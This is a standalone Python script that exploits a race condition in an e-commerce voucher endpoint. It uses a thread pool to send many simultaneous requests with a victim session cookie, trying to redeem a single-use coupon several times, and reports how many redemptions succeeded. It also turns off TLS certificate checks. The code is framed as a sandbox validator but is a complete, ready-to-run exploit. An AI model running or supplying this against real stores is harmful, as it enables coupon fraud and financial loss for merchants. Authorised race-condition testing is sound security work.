import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def send_race_request(session, url, payload, headers, request_id):
    try:
        # Fire the POST request instantly
        resp = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
        return request_id, resp.status_code, resp.text
    except Exception as e:
        return request_id, "ERROR", str(e)

def execute_race_condition(target_endpoint, session_cookie, voucher_code, threads=30):
    print(r'''
    [*] Initializing High-Velocity Proportional Thread Pool...
    [*] Attempting to break 1:1 transaction ratio boundaries.
    ''')
    
    url = target_endpoint.rstrip('/') + "/api/v1/cart/apply-voucher"
    
    headers = {
        "Cookie": f"session={session_cookie}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 Race-Condition-Validator/2.1"
    }
    
    payload = {"coupon_code": voucher_code}
    
    # Establish a unified session manager
    s = requests.Session()
    
    print(f"[*] Dispatching {threads} concurrent threads simultaneously...")
    results = []
    
    # Fire all requests concurrently using a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(send_race_request, s, url, payload, headers, i): i 
            for i in range(threads)
        }
        
        for future in as_completed(futures):
            results.append(future.result())
            
    # Parse the asynchronous results matrix
    success_count = 0
    for req_id, status_code, body in results:
        print(f"[Thread-{req_id}] Server Status Response: {status_code}")
        # Customize this indicator check based on what your target application returns
        if status_code == 200 and "Voucher applied successfully" in body:
            success_count += 1
            
    print("\n" + "="*50)
    print(f"[*] Total execution threads processed: {threads}")
    print(f"[*] Total successful applications logged: {success_count}")
    
    if success_count > 1:
        print(f"[HIGH-SEVERITY VULNERABILITY] Race Condition Confirmed! Code used {success_count} times.")
    else:
        print("[-] Target safe. Database successfully locked and isolated execution threads sequentially.")
    print("="*50)

if __name__ == "__main__":
    TARGET = "https://your-testing-sandbox.com"
    COOKIE = "ACTIVE_USER_SESSION_COOKIE_VALUE"
    VOUCHER = "WELCOME100" # Single-use coupon code
    
    execute_race_condition(TARGET, COOKIE, VOUCHER, threads=25)
